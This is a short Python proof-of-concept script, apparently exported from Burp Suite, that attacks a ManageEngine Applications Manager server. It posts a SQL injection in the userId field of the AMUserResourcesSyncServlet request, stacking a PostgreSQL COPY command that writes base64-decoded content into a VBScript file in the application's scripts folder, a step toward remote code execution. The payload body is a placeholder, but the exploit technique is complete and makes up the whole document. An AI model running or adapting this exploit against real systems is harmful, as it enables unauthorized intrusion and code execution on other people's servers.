import requests

burp0_url = "https://192.168.137.113:8443/servlet/AMUserResourcesSyncServlet"
burp0_headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Language": "en-US,en;q=0.5"
        }
burp0_data = {
        "ForMasRange": "1",
        "userId": "1;copy(select convert_from(decode($$test$$,$$base64$$),$$utf-8$$)) to $$C:\\\\Program Files (x86)\\\\ManageEngine\\\\AppManager12\\\\working\\\\conf\\\\\\\\application\\\\scripts\\\\test6.vbs$$;"
        }
requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
